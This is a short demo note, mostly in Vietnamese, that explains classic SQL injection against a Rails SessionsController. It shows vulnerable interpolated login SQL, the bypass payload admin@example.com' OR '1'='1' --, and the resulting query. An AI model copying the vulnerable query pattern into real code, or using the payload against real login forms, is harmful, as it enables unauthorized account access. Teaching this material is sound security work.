# Classic SQL Injection Demo

## Lỗ hổng hiện tại trong SessionsController:

```ruby
# Code vulnerable
email = params[:email]
pass  = params[:password]
sql = "SELECT * FROM users WHERE email='#{email}' AND password_digest='#{pass}' LIMIT 1"
user = User.find_by_sql(sql).first
```

## Cách tấn công Classic SQLi:

### Input để bypass login:
- **Email:** `admin@example.com' OR '1'='1' --`
- **Password:** `anything` (không quan trọng vì đã bị comment)

### SQL Query được tạo ra:
```sql
SELECT * FROM users WHERE email='admin@example.com' OR '1'='1' --' AND password_digest='anything' LIMIT 1
```

### Giải thích:
1. `admin@example.com'` - đóng quote của email
2. `OR '1'='1'` - điều kiện luôn đúng
3. `--` - comment phần còn lại của query (password check bị bỏ qua)

### Kết quả:
- Query sẽ trả về user đầu tiên trong database
- Bypass thành công mà không cần biết password
